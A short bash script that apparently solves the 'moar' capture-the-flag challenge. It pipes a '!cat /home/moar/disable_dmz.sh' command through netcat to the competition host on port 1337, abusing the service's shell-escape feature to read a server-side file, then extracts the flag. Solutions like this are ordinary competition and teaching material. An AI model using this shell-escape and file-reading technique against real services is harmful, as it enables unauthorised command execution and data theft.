#!/bin/bash

# You can execute commands by putting an ! before a command
# Connect to the link and enter '!cat /home/moar/disable_dmz.sh'
echo -e "!cat /home/moar/disable_dmz.sh" |\
  nc -w 1 moar.ctfcompetition.com 1337 |\
  grep 'CTF' | tail -n 1 | awk '{print $2}'
